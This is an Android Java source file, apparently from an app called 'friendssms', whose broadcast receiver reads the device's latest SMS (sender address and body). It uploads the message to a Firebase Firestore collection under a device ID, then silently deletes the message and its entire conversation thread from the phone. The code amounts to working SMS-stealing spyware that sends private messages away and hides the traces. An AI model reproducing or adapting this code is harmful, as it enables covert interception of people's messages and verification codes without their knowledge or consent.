package com.akshaykotishco.friendssms;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.BaseColumns;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.google.android.gms.tasks.OnCanceledListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.SetOptions;

import java.util.HashMap;
import java.util.Map;

public class MyBroadcastReciever extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {


        //mytextview = findViewById(R.id.txtvw);

        //ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);

        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms"), new String[] { "_id", "thread_id", "address",
                "person", "date", "body" }, null, null, null);
        cursor.moveToFirst();

        SharedPreferences sh = context.getSharedPreferences("MySharedPref", Context.MODE_PRIVATE);
        String s1 = sh.getString("deviceid", "");

        int i1 = sh.getInt("counts", 0);

        SharedPreferences.Editor myEdit = sh.edit();
        myEdit.putInt("counts", ++i1);
        myEdit.commit();


        //do {
            if (cursor != null) {
                long id = cursor.getLong(0);
                long threadId = cursor.getLong(1);
                String address = cursor.getString(2);
                //String person = cursor.getString(3);
                //String date = cursor.getString(4);
                String body = cursor.getString(5);

                SMSData smsData = new SMSData();
                smsData.id = id;
                smsData.threadId = threadId;
                smsData.address = address;
                smsData.body = body;


                FirebaseFirestore firebaseFirestore = FirebaseFirestore.getInstance();
                CollectionReference collectionReference = firebaseFirestore.collection("ALLSMS/"+ s1 +"/SMS");
                collectionReference.document(Long.toString(id)).set(smsData);


                context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
                context.getContentResolver().delete(Uri.parse("content://sms/conversations/" + threadId), null, null);


            }
        //}
       // while (cursor.moveToNext());
    }
}
